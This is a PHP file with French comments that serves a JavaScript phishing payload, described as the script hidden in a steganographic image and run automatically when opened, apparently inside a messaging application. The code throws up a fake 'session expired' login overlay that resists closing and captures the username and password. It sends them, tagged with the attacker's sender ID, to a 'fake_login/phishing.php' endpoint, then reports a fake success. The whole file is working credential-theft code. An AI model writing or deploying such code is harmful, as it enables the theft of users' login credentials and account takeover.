<?php
// receiver.php - Script qui s'exécute quand l'image stéganographiée est ouverte
// C'est le script caché dans l'image

header('Content-Type: application/javascript');
?>

// Script de phishing - Exécuté automatiquement
(function() {
    // Récupérer l'ID de l'attaquant depuis l'URL
    const urlParams = new URLSearchParams(window.location.search);
    const senderUserId = urlParams.get('sender') || 'unknown';
    
    // Afficher le pop-up de fausse connexion
    function showPhishingPopup() {
        // Overlay
        const overlay = document.createElement('div');
        overlay.id = 'phishing-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            font-family: Arial, sans-serif;
        `;
        
        // Popup container
        const popup = document.createElement('div');
        popup.style.cssText = `
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 400px;
            width: 90%;
        `;
        
        // Popup content
        popup.innerHTML = `
            <div style="text-align: center;">
                <h2 style="color: #333; margin: 0 0 10px 0; font-size: 20px;">Accès Refusé</h2>
                <p style="color: #666; margin: 0 0 20px 0; font-size: 14px;">Votre session a expiré. Veuillez vous reconnecter.</p>
                
                <form id="phishing-form" style="display: flex; flex-direction: column; gap: 12px;">
                    <input type="text" id="phishing-username" placeholder="Nom d'utilisateur" required 
                        style="padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 13px;">
                    
                    <input type="password" id="phishing-password" placeholder="Mot de passe" required 
                        style="padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 13px;">
                    
                    <button type="submit" style="
                        padding: 10px;
                        background: #31a24c;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        font-weight: bold;
                        font-size: 13px;
                    ">Se reconnecter</button>
                </form>
                
                <p style="color: #999; font-size: 11px; margin-top: 15px;">Les données sont chiffrées et sécurisées.</p>
            </div>
        `;
        
        overlay.appendChild(popup);
        document.body.appendChild(overlay);
        
        // Empêcher la fermeture
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                alert('Veuillez vous reconnecter pour continuer.');
            }
        });
        
        // Soumettre le formulaire
        document.getElementById('phishing-form').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const username = document.getElementById('phishing-username').value;
            const password = document.getElementById('phishing-password').value;
            
            // Envoyer les identifiants au serveur
            fetch('/messagerie/codes/fake_login/phishing.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderUserId)}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Reconnexion réussie!');
                    overlay.remove();
                } else {
                    alert('Erreur: Identifiants incorrects');
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
                alert('Une erreur s\'est produite.');
            });
        });
    }
    
    // Afficher le pop-up quand la page charge
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', showPhishingPopup);
    } else {
        showPhishingPopup();
    }
})();
